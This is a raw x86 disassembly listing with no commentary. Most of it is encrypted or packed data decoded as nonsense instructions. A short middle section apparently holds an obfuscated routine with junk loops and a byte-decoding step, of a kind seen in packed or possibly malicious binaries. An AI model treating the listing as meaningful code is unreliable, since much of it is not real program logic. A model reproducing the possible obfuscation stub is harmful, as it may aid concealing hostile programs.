  406978:	retf   0xf4b8
  40697b:	fstp   QWORD PTR [edi-0x53282fd7]
  406981:	add    al,0xf0
  406983:	pop    esi
  406984:	dec    eax
  406985:	adc    eax,0xddce6b8c
  40698a:	xor    ch,BYTE PTR [ebx+esi*2+0x2d]
  40698e:	push   ds
  40698f:	xor    DWORD PTR [ebp+0x7a],esi
  406992:	inc    edi
  406993:	in     eax,dx
  406994:	adc    dh,BYTE PTR [edx+0x43]
  406997:	mov    ds:0x1967fa4f,eax
  40699c:	stos   BYTE PTR es:[edi],al
  40699d:	sub    BYTE PTR ds:0x38459142,cl
  4069a3:	push   esp
  4069a4:	xchg   ebx,eax
  4069a5:	mov    al,ds:0xf4793dd2
  4069aa:	push   ecx
  4069ab:	mov    esi,0xf8b780b9
  4069b0:	and    bl,BYTE PTR [ebx+0x198c1b11]
  4069b6:	fisubr WORD PTR [esi]
  4069b8:	jno    0x406964
  4069ba:	(bad)  
  4069bb:	sbb    BYTE PTR [ebp+0x5c57101f],cl
  4069c1:	mov    ebx,0x33409a02
  4069c6:	rol    BYTE PTR [eax+0x72],0x6d
  4069ca:	mov    ebx,0x30728003
  4069cf:	je     0x4069f7
  4069d1:	and    ah,bh
  4069d3:	scas   al,BYTE PTR es:[edi]
  4069d4:	(bad)  
  4069d5:	xchg   esp,eax
  4069d6:	fcomp  DWORD PTR [esi+ebx*4+0x65]
  4069da:	sbb    DWORD PTR [eax+0x46bd1ef5],ebx
  4069e0:	outs   dx,DWORD PTR ds:[esi]
  4069e1:	test   BYTE PTR [edi+0x43eece1d],bl
  4069e7:	mov    ebx,0x98ae2078
  4069ec:	xor    ebp,DWORD PTR [eax-0x499bebf0]
  4069f2:	add    ebp,DWORD PTR es:[eax+edi*1-0x4809ed80]
  4069fa:	test   cl,0x7
  4069fd:	jle    0x406a64
  4069ff:	cdq    
  406a00:	stos   BYTE PTR es:[edi],al
  406a01:	fisttp WORD PTR [ebx]
  406a03:	dec    eax
  406a04:	icebp  
  406a05:	mov    edi,0x802f5fa3
  406a0a:	or     al,0x56
  406a0c:	jb     0x4069c9
  406a0e:	mov    ds:0x95b1af12,eax
  406a13:	repz mov ah,0x73
  406a16:	shr    dh,cl
  406a18:	inc    ecx
  406a19:	xchg   ebp,eax
  406a1a:	push   ebp
  406a1b:	adc    ebx,DWORD PTR [esi+0x6a]
  406a1e:	add    bl,dh
  406a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a21:	push   0x51
  406a23:	je     0x4069dd
  406a25:	and    dl,BYTE PTR [edx]
  406a27:	lods   eax,DWORD PTR ds:[esi]
  406a28:	pop    ecx
  406a29:	jno    0x406a5b
  406a2b:	sub    eax,0xde24c688
  406a30:	mov    edx,DWORD PTR [eax+0x4c]
  406a33:	js     0x406ab1
  406a35:	sar    DWORD PTR [ebp+0x35],cl
  406a38:	jecxz  0x406a75
  406a3a:	lea    ecx,[ebx-0xbb621b9]
  406a40:	mov    dl,0x11
  406a42:	(bad)  
  406a43:	pop    eax
  406a44:	jmp    0x4e6c6314
  406a49:	xor    eax,0xd6e8615b
  406a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a4f:	inc    edx
  406a50:	mov    gs,edi
  406a52:	icebp  
  406a53:	imul   bl
  406a55:	mov    fs,WORD PTR [edi-0xf]
  406a58:	dec    eax
  406a59:	mov    dh,0xe8
  406a5b:	fisubr DWORD PTR [esp+edi*2+0x7]
  406a5f:	shl    bl,0xa1
  406a62:	ss loope 0x406ae1
  406a65:	idiv   BYTE PTR [ebp-0x3e]
  406a68:	je     0x406a0c
  406a6a:	ret    
  406a6b:	adc    ecx,ecx
  406a6d:	sub    esp,DWORD PTR [edx+0x2fd02592]
  406a73:	daa    
  406a74:	aad    0x86
  406a76:	xlat   BYTE PTR ds:[ebx]
  406a77:	(bad)  
  406a78:	adc    eax,0x64d155e2
  406a7d:	aaa    
  406a7e:	jle    0x406a18
  406a80:	addr16 dec ebx
  406a82:	cld    
  406a83:	or     cl,BYTE PTR ds:0x3f59ca19
  406a89:	or     eax,0x53ac3de8
  406a8e:	and    al,BYTE PTR [edi+0x79b45dd5]
  406a94:	adc    ch,bh
  406a96:	pop    ds
  406a97:	jg     0x406a36
  406a99:	pop    ebp
  406a9a:	gs xchg edi,eax
  406a9c:	pop    esi
  406a9d:	mov    dl,0xf1
  406a9f:	jecxz  0x406b02
  406aa1:	ins    BYTE PTR es:[edi],dx
  406aa2:	shl    DWORD PTR [ecx+0x78],0x31
  406aa6:	test   eax,0xc6c09eb3
  406aab:	sub    BYTE PTR ds:0xf383f049,bl
  406ab1:	jmp    0x406a9f
  406ab3:	fidivr WORD PTR [eax+0x34]
  406ab6:	and    BYTE PTR [edi],ch
  406ab8:	dec    ecx
  406ab9:	and    bh,0x63
  406abc:	cs pop edx
  406abe:	xchg   esp,eax
  406abf:	dec    ebp
  406ac0:	push   edi
  406ac1:	pop    eax
  406ac2:	stc    
  406ac3:	mov    ebp,0xdd4b1e59
  406ac8:	and    DWORD PTR [ebx+0x28],ebx
  406acb:	scas   al,BYTE PTR es:[edi]
  406acc:	push   ecx
  406acd:	mov    dh,0x2b
  406acf:	fcomp  QWORD PTR [eax+0x62]
  406ad2:	push   0x7c71ba6e
  406ad7:	aaa    
  406ad8:	loopne 0x406b30
  406ada:	neg    DWORD PTR [edi-0x545cf70e]
  406ae0:	ins    DWORD PTR es:[edi],dx
  406ae1:	inc    ecx
  406ae2:	xchg   BYTE PTR [ecx],al
  406ae4:	and    eax,0xee65c426
  406ae9:	cs jp  0x406ac1
  406aec:	in     al,0x71
  406aee:	mov    ds:0xc048e287,al
  406af3:	pop    eax
  406af4:	out    dx,al
  406af5:	(bad)  ds:0x92b61679
  406afb:	xlat   BYTE PTR ds:[ebx]
  406afc:	mov    ds:0x944b7739,eax
  406b01:	add    al,0x47
  406b03:	and    BYTE PTR [ebp+esi*2+0x5d59af6c],ch
  406b0a:	xchg   esi,eax
  406b0b:	pop    edx
  406b0c:	jbe    0x406b7e
  406b0e:	mov    edx,0x301fc780
  406b13:	sti    
  406b14:	push   ecx
  406b15:	stc    
  406b16:	js     0x406aa9
  406b18:	dec    esp
  406b19:	xchg   esp,eax
  406b1a:	test   BYTE PTR [ebp-0x6],bh
  406b1d:	inc    ecx
  406b1e:	or     DWORD PTR [eax-0xef4ec4c],eax
  406b24:	daa    
  406b25:	mov    eax,ds:0x2692bad6
  406b2a:	pop    ecx
  406b2b:	push   0xd07c1ee9
  406b30:	shl    bh,0xc3
  406b33:	ds push ds
  406b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b36:	push   ebp
  406b37:	fwait
  406b38:	xor    al,0x72
  406b3a:	in     al,0x96
  406b3c:	out    0xd3,al
  406b3e:	jp     0x406bac
  406b40:	test   al,0x4c
  406b42:	mul    bh
  406b44:	mov    ebx,0x73d58f03
  406b49:	fs shr bh,0x77
  406b4d:	sbb    BYTE PTR [ecx-0x4bebf856],dh
  406b53:	ficom  DWORD PTR [eax+0x62]
  406b56:	loopne 0x406b19
  406b58:	jns    0x406b9a
  406b5a:	push   esi
  406b5b:	arpl   WORD PTR [ebx+0xb375d9d],cx
  406b61:	push   ss
  406b62:	mov    cl,0xb2
  406b64:	mov    edi,0xac22e2c4
  406b69:	jge    0x406bc7
  406b6b:	or     esp,DWORD PTR [ecx-0x7451ecd1]
  406b71:	sti    
  406b72:	dec    esp
  406b73:	mov    al,ds:0x484f26ce
  406b78:	add    al,0x27
  406b7a:	cmp    ebp,edi
  406b7c:	mov    ecx,0x1efa913d
  406b81:	push   ebp
  406b82:	int    0x31
  406b84:	and    dh,BYTE PTR [eax]
  406b86:	sub    al,al
  406b88:	xor    ch,BYTE PTR [edi]
  406b8a:	jmp    0x9b44:0x75b6eae8
  406b91:	in     al,dx
  406b92:	xchg   ebx,eax
  406b93:	add    esp,DWORD PTR ds:0x898db644
  406b99:	frstor [edx]
  406b9b:	pop    es
  406b9c:	outs   dx,BYTE PTR ds:[esi]
  406b9d:	cmp    BYTE PTR [esi+0x16aeeb55],ch
  406ba3:	mov    ah,0xa2
  406ba5:	gs out dx,al
  406ba7:	mov    DWORD PTR [eax],ebp
  406ba9:	jl     0x406ba8
  406bab:	lods   al,BYTE PTR ds:[esi]
  406bac:	mov    eax,0xcae79402
  406bb1:	push   0x56
  406bb3:	jo     0x406b7a
  406bb5:	mov    al,BYTE PTR [edx+0x50]
  406bb8:	out    0xdc,al
  406bba:	adc    al,0xae
  406bbc:	jecxz  0x406bd2
  406bbe:	inc    edx
  406bbf:	fcomip st,st(4)
  406bc1:	sub    BYTE PTR [ebx-0x7fdf00da],ah
  406bc7:	imul   edi,DWORD PTR [eax],0xe2ede8eb
  406bcd:	mov    eax,ds:0xea42f2a7
  406bd2:	and    eax,0xf09f950e
  406bd7:	mov    cs,ecx
  406bd9:	jo     0x406b6b
  406bdb:	mov    cl,0x2d
  406bdd:	pop    DWORD PTR [ebx-0x11]
  406be0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406be1:	int    0x6c
  406be3:	ins    DWORD PTR es:[edi],dx
  406be4:	cmc    
  406be5:	rol    DWORD PTR [ecx+0x151d41ea],1
  406beb:	sti    
  406bec:	add    bl,ch
  406bee:	gs xchg ebx,eax
  406bf0:	mov    dh,0x6f
  406bf2:	out    0xb5,eax
  406bf4:	push   DWORD PTR [ecx-0x3976ede9]
  406bfa:	push   esp
  406bfb:	ficom  DWORD PTR [edx]
  406bfd:	(bad)  
  406bff:	inc    eax
  406c00:	scas   eax,DWORD PTR es:[edi]
  406c01:	test   ah,bh
  406c03:	sti    
  406c04:	mov    edx,0x9b472ae4
  406c09:	mov    edx,0x24a3bb46
  406c0e:	and    al,BYTE PTR [ecx+0x0]
  406c11:	mov    eax,DWORD PTR [ebp+0xc]
  406c14:	xor    eax,ecx
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	outs   dx,DWORD PTR ds:[esi]
  406c28:	call   0xca79041f
  406c2d:	jle    0x406cad
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	xor    DWORD PTR [edx],0xffffffbc
  406c36:	lods   eax,DWORD PTR ds:[esi]
  406c37:	rcr    BYTE PTR [esp+edi*1-0x78dfd9b5],cl
  406c3e:	sahf   
  406c3f:	fisttp QWORD PTR [edx]
  406c41:	adc    al,0x93
  406c43:	call   0x6c3702fb
  406c48:	lea    ecx,[ecx+0x74e44201]
  406c4e:	(bad)  
  406c4f:	scas   eax,DWORD PTR es:[edi]
  406c50:	daa    
  406c51:	pop    edi
  406c52:	loope  0x406bec
  406c54:	lock in al,dx
  406c56:	jge    0x406c09
  406c58:	push   ds
  406c59:	ins    DWORD PTR es:[edi],dx
  406c5a:	test   BYTE PTR [ebx+0x11],ah
  406c5d:	and    DWORD PTR [ebx],eax
  406c5f:	pop    ecx
  406c60:	pop    esp
  406c61:	fidiv  WORD PTR [ebx+0x105add84]
  406c67:	push   ds
  406c68:	ret    
  406c69:	(bad)  
  406c6a:	push   ebp
  406c6b:	xchg   DWORD PTR [ebx+0x31923584],ecx
  406c71:	hlt    
  406c72:	sbb    BYTE PTR [eax-0x22253277],bl
  406c78:	adc    al,0x64
  406c7a:	fist   WORD PTR [ebx+ecx*8-0x1ae065dc]
  406c81:	jmp    0x406c9f
  406c83:	aaa    
  406c84:	aad    0x98
  406c86:	dec    ebp
  406c87:	(bad)  
  406c88:	push   eax
  406c89:	out    dx,eax
  406c8a:	pop    ebp
  406c8b:	xor    al,0x21
  406c8d:	(bad)  
  406c8e:	mov    cl,0x81
  406c90:	ret    
  406c91:	fdivr  DWORD PTR [edi+0x0]
  406c94:	(bad)  
  406c95:	jge    0x406d03
  406c97:	jae    0x406c3e
  406c99:	shr    BYTE PTR [edx],1
  406c9b:	das    
  406c9c:	cmp    edi,edi
  406c9e:	mov    esp,DWORD PTR [ecx]
  406ca0:	ds clc 
  406ca2:	sbb    DWORD PTR [ebx],eax
  406ca4:	stos   BYTE PTR es:[edi],al
  406ca5:	nop
  406ca6:	lahf   
  406ca7:	or     al,0xb
  406ca9:	addr16 xor dh,bl
  406cac:	push   ecx
  406cad:	mov    eax,ds:0xb592515d
  406cb2:	enter  0xb0c2,0x8f
  406cb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cb7:	mov    ebp,0x42a4446
  406cbc:	call   0xbd3cc5b1
  406cc1:	mov    DWORD PTR [edx],esp
  406cc3:	ds js  0x406c5f
  406cc6:	xor    dl,BYTE PTR [edx-0x66]
  406cc9:	outs   dx,BYTE PTR ds:[esi]
  406cca:	out    0x68,eax
  406ccc:	adc    DWORD PTR [edi],esp
  406cce:	jmp    0xc97b:0x3575c6ed
  406cd5:	sti    
  406cd6:	push   eax
  406cd7:	in     al,dx
  406cd8:	pop    edx
  406cd9:	dec    edi
  406cda:	add    BYTE PTR [esi],bl
  406cdc:	mov    WORD PTR [ecx-0x33],es
  406cdf:	inc    ebx
  406ce0:	pop    ss
  406ce1:	mov    DWORD PTR [ebp+0x47],edx
  406ce4:	push   ebx
  406ce5:	enter  0x6c0c,0x78
  406ce9:	int3   
  406cea:	sub    DWORD PTR [esi+0x48ea9f80],esi
  406cf0:	push   ecx
  406cf1:	in     eax,0xba
  406cf3:	loope  0x406d39
  406cf5:	xlat   BYTE PTR ds:[ebx]
  406cf6:	int    0x9f
  406cf8:	ins    BYTE PTR es:[edi],dx
  406cf9:	and    BYTE PTR [eax+ebp*4-0x4],cl
  406cfd:	mov    ds:0xa605a7eb,eax
  406d02:	push   ecx
  406d03:	jne    0x406d27
  406d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d06:	hlt    
  406d07:	push   ebp
  406d08:	cmp    al,ch
  406d0a:	cld    
  406d0b:	mov    eax,ds:0x46b8db84
  406d10:	in     al,dx
  406d11:	jg     0x406d34
  406d13:	jmp    0x14eb:0x37bcc686
  406d1a:	cmc    
  406d1b:	jo     0x406d8f
  406d1d:	xchg   esi,eax
  406d1e:	je     0x406ce8
  406d20:	adc    DWORD PTR [ebx+eax*8+0x2e],edi
  406d24:	mov    ecx,0xa7a178e6
  406d29:	xor    esi,eax
  406d2b:	icebp  
  406d2c:	test   al,0x1b
  406d2e:	call   0xd8af24fa
  406d33:	adc    eax,0x185ca3bd
  406d38:	bound  edx,QWORD PTR [ecx+0x1fa3e1f]
  406d3e:	in     al,0x5f
  406d40:	or     edi,ebx
  406d42:	pop    edx
  406d43:	xchg   DWORD PTR [esi-0x48],esi
  406d46:	jl     0x406d73
  406d48:	or     BYTE PTR [ebp+ebp*4+0x79fa1ff1],dl
  406d4f:	call   0x8fc7dba4
  406d54:	xchg   esi,eax
  406d55:	dec    eax
  406d56:	cmp    al,0x67
  406d58:	sbb    DWORD PTR [ecx+ebp*2],esi
  406d5b:	in     al,0x5e
  406d5d:	cmp    BYTE PTR [ebp-0x5e],dh
  406d60:	mov    DWORD PTR ss:[bx+di-0x30a2],0x2608928
  406d6a:	(bad)  
  406d6b:	bound  edi,QWORD PTR [ebx+0x13]
  406d6e:	popa   
  406d6f:	sub    DWORD PTR [edx+ebx*1],0x3b0d26f1
  406d76:	mov    al,ds:0x31fb581b
  406d7b:	ins    DWORD PTR es:[edi],dx
  406d7c:	aaa    
  406d7d:	xor    al,0x2f
  406d7f:	lds    ecx,FWORD PTR [esi]
  406d81:	in     eax,0xac
  406d83:	stc    
  406d84:	dec    esi
  406d85:	nop
  406d86:	lods   al,BYTE PTR ds:[esi]
  406d87:	js     0x406d30
  406d89:	mov    ebx,0x885a60c7
  406d8e:	jne    0x406db7
  406d90:	cmp    cl,dl
  406d92:	sar    BYTE PTR [edi-0x9d22aa3],1
  406d98:	scas   eax,DWORD PTR es:[edi]
  406d99:	jmp    FWORD PTR [ebx-0x15a07172]
  406d9f:	mov    BYTE PTR [ebp+0x79],cl
  406da2:	cld    
  406da3:	inc    esp
  406da4:	imul   edx,DWORD PTR [ebx],0xffffffb8
  406da7:	nop
  406da8:	rcl    edi,cl
  406daa:	outs   dx,BYTE PTR ds:[esi]
  406dab:	ins    BYTE PTR es:[edi],dx
  406dac:	jno    0x406dc3
  406dae:	lahf   
  406daf:	adc    al,0x9b
  406db1:	jns    0x406dff
  406db3:	pop    eax
  406db4:	sbb    eax,0x1e929949
  406db9:	js     0x406d73
  406dbb:	dec    ecx
  406dbc:	loope  0x406db1
  406dbe:	xchg   ebx,eax
  406dbf:	repz and eax,esp
  406dc2:	push   ss
  406dc3:	mov    ah,0xf7
  406dc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dc6:	fimul  WORD PTR ds:0x7c707588
  406dcc:	arpl   WORD PTR ds:0xc60e3f5d,sp
  406dd2:	mov    edi,?
  406dd4:	fadd   st,st(4)
  406dd6:	jge    0x406df5
  406dd8:	inc    ebp
  406dd9:	or     al,0xf5
  406ddb:	and    eax,0xcbb4a841
  406de0:	js     0x406e5e
  406de2:	fs xchg ebp,eax
  406de4:	sub    al,0xf7
  406de6:	dec    ebx
  406de7:	(bad)  
  406de8:	icebp  
  406de9:	xchg   ebx,eax
  406dea:	mov    ch,0x6
  406dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ded:	push   es
  406dee:	pop    esp
  406def:	pusha  
  406df0:	pop    ds
  406df1:	cs test al,0x2a
  406df4:	sub    al,0x39
  406df6:	into   
  406df7:	lods   eax,DWORD PTR ds:[esi]
  406df8:	(bad)  
  406dfa:	(bad)  
  406dfb:	in     al,dx
  406dfc:	adc    DWORD PTR ds:0xcc9ab8e,0x7b
  406e03:	add    DWORD PTR [edi+0x4a],eax
  406e06:	ds pop es
  406e08:	das    
  406e09:	sbb    edx,DWORD PTR [ebx+ebx*1]
  406e0c:	mov    WORD PTR [ecx-0x44b41d7f],?
  406e12:	push   ecx
  406e13:	push   cs
  406e14:	retf   0xbaaf
  406e17:	sub    eax,0xf5250ff0
  406e1c:	or     eax,0xa934cdda
  406e21:	jne    0x406de6
  406e23:	repz adc dl,bh
  406e26:	std    
  406e27:	dec    ebp
  406e28:	cmp    eax,0x9916d922
  406e2d:	or     bh,dl
  406e2f:	cli    
  406e30:	les    edx,FWORD PTR ds:0x90ed7b23
  406e36:	mov    ebp,0x64cbe106
  406e3b:	sbb    esi,DWORD PTR [esi+0x2dc262bb]
  406e41:	(bad)  
  406e42:	scas   al,BYTE PTR es:[edi]
  406e43:	dec    esi
  406e44:	in     eax,0xe1
  406e46:	dec    edx
  406e47:	mov    edi,0x81298f49
  406e4c:	daa    
  406e4d:	xlat   BYTE PTR ds:[ebx]
  406e4e:	push   0xffffffdf
  406e50:	adc    ecx,0xad954803
  406e56:	int    0x6c
  406e58:	aas    
  406e59:	adc    DWORD PTR [ebp+0x317611ad],0x6a
  406e60:	or     dl,BYTE PTR [edi+eax*1]
  406e63:	add    ch,BYTE PTR [edx+0x72]
  406e66:	jmp    0x9b94:0xe9009658
  406e6d:	push   eax
  406e6e:	adc    BYTE PTR [ebx],0xb0
  406e71:	leave  
  406e72:	lds    ebx,FWORD PTR [ebp+0x6cbc11cc]
  406e78:	mov    dh,0xa6
  406e7a:	lock mov dl,0xbb
  406e7d:	cmc    
  406e7e:	sub    DWORD PTR [edi+0x5d],esi
  406e81:	loopne 0x406e3a
  406e83:	es xchg edx,eax
  406e85:	and    eax,0xb30645b
  406e8a:	adc    eax,0xcbad7840
  406e8f:	sbb    eax,0x2de321
  406e94:	sar    DWORD PTR [ecx+edi*8+0xe],cl
  406e98:	ret    0x6601
  406e9b:	xor    esi,edi
  406e9d:	stos   BYTE PTR es:[edi],al
  406e9e:	sbb    BYTE PTR [ebx],dl
  406ea0:	pop    ebx
  406ea1:	lods   eax,DWORD PTR ds:[esi]
  406ea2:	push   ss
  406ea3:	add    dl,ah
  406ea5:	push   ebx
  406ea6:	mov    ecx,0xc042e20e
  406eab:	fs xchg edx,eax
  406ead:	inc    edi
  406eae:	mov    cs,WORD PTR [ebx]
  406eb0:	les    edx,FWORD PTR [ecx-0x2a]
  406eb3:	ins    DWORD PTR es:[edi],dx
  406eb4:	cmp    BYTE PTR [ebp+0xa8e4efe],bl
  406eba:	daa    
  406ebb:	fist   WORD PTR [eax+0x4a75aeff]
  406ec1:	adc    DWORD PTR [ebp-0xe],ecx
  406ec4:	sub    ah,BYTE PTR [ecx-0x6dc6bada]
  406eca:	jg     0x406eb9
  406ecc:	xor    DWORD PTR ds:[eax-0x3c186c8d],edi
  406ed3:	pop    ss
  406ed4:	scas   al,BYTE PTR es:[edi]
  406ed5:	xor    al,0xa0
  406ed7:	jne    0x406f32
  406ed9:	out    dx,al
  406eda:	imul   edx,esp,0x35
  406edd:	mov    ch,BYTE PTR [ebx+0x73]
  406ee0:	sbb    BYTE PTR [ebx+edi*2-0x22],dl
  406ee4:	scas   eax,DWORD PTR es:[edi]
  406ee5:	add    DWORD PTR [ebx-0x43],edx
  406ee8:	mov    ds:0xeb92524b,eax
  406eed:	shr    BYTE PTR [eax],0x8b
  406ef0:	inc    ebp
  406ef1:	mov    ah,0x58
  406ef3:	push   edi
  406ef4:	loop   0x406ec4
  406ef6:	sbb    edi,DWORD PTR [edx+0xe881321]
  406efc:	sub    DWORD PTR [esi+0x6f],esi
  406eff:	mov    esp,0x86ed1fd4
  406f04:	xlat   BYTE PTR ds:[ebx]
  406f05:	stos   BYTE PTR es:[edi],al
  406f06:	cmp    BYTE PTR [eax+0x33],dh
  406f09:	in     eax,0xc3
  406f0b:	and    ah,BYTE PTR [eax-0x4bb01351]
  406f11:	gs es pop ss
  406f14:	sbb    bl,BYTE PTR [eax-0x6e823ceb]
  406f1a:	adc    eax,0x782dc461
  406f1f:	(bad)  
  406f20:	into   
  406f21:	call   0x9b0a5fe3
  406f26:	sbb    DWORD PTR [ebx-0x57d660e2],0xfffffff1
  406f2d:	sbb    ecx,esp
  406f2f:	pop    ebp
  406f30:	aam    0x96
  406f32:	and    al,0x12
  406f34:	das    
  406f35:	mov    al,0x28
  406f37:	or     BYTE PTR [edx-0x5c2abb37],dh
  406f3d:	add    dh,BYTE PTR [ebp+esi*2-0x626a2f15]
  406f44:	jmp    0x406f00
  406f46:	fimul  DWORD PTR [ebx-0x1d]
  406f49:	loopne 0x406fca
  406f4b:	ja     0x406f90
  406f4d:	and    dh,BYTE PTR [ebp*1+0x5c18f5cc]
  406f54:	sbb    bl,BYTE PTR [ebp+0x2e]
  406f57:	stos   BYTE PTR es:[edi],al
  406f58:	aaa    
  406f59:	mov    ds,WORD PTR [edx-0x68b7f45a]
  406f5f:	inc    edx
  406f60:	ins    BYTE PTR es:[edi],dx
  406f61:	add    eax,0x75d8ec42
  406f66:	sub    al,0x26
  406f68:	xchg   esi,eax
  406f69:	out    0xb8,eax
  406f6b:	mov    dl,ch
  406f6d:	pushf  
  406f6e:	daa    
  406f6f:	or     eax,0x878b5964
  406f74:	push   0xffffffec
  406f76:	xchg   DWORD PTR [edi-0x73],ebx
  406f79:	jae    0x406f00
  406f7b:	mov    cs,WORD PTR [esi+0x7b]
  406f7e:	retf   
  406f7f:	aam    0x3c
  406f81:	jo     0x406f1c
  406f83:	mov    ah,0xd1
  406f85:	popa   
  406f86:	lea    ebx,[ebx+edi*4-0x4c]
  406f8a:	shl    BYTE PTR ds:0xddd25143,cl
  406f90:	stc    
  406f91:	pop    ebp
  406f92:	sub    BYTE PTR gs:[edi-0x56fac484],al
  406f99:	sbb    ah,BYTE PTR [edx]
  406f9b:	sbb    esp,esi
  406f9d:	jmp    0xc24434e3
  406fa2:	mov    ds:0x41222c,eax
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430496,0x19
  406fd8:	cmp    DWORD PTR ds:0x430496,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430496,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42eac4
  406ffd:	cmp    DWORD PTR ds:0x430496,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430496
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430496,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430496
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430496,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x430556,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x43054a,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ee18,0x42ee20
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ee10,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ee1c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ee1c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ee1c,ecx
  407083:	cmp    DWORD PTR ds:0x42ee1c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42eba4
  4070a9:	cmp    DWORD PTR ds:0x42ee1c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ee1c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ee1c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ee1c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x43055a,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42ee28,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42ee28
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42ee28,ecx
  4070fe:	cmp    DWORD PTR ds:0x42ee28,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42ee28,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42ee24
  407123:	call   DWORD PTR ds:0x42eba8
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x4304ba
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430492,0x17
  407147:	cmp    DWORD PTR ds:0x430492,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430492,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42ea04
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430492
  407179:	dec    eax
  40717a:	mov    ds:0x430492,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0x73b0b56
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x4071e0
  4071b2:	loope  0x407203
  4071b4:	jle    0x407225
  4071b6:	mov    ds:0x8a68b29b,al
  4071bb:	inc    edi
  4071bc:	sub    eax,0xcd3eaf18
  4071c1:	popf   
  4071c2:	lea    eax,[ecx]
  4071c4:	mov    DWORD PTR [edi+0x38],ebx
  4071c7:	call   0x5c6dc04
  4071cc:	leave  
  4071cd:	mov    al,ds:0xd8a6f407
  4071d2:	add    cl,al
  4071d4:	add    bl,0xa2
  4071d7:	pop    edi
  4071d8:	std    
  4071d9:	dec    ebp
  4071da:	clc    
  4071db:	jbe    0x407218
  4071dd:	cmp    ebx,DWORD PTR [edi]
  4071df:	push   ebp
  4071e0:	ins    DWORD PTR es:[edi],dx
  4071e1:	aaa    
  4071e2:	push   es
  4071e3:	mov    bh,0xd2
  4071e5:	jnp    0x4071e2
  4071e7:	popa   
  4071e8:	jb     0x407249
  4071ea:	fwait
  4071eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ec:	popf   
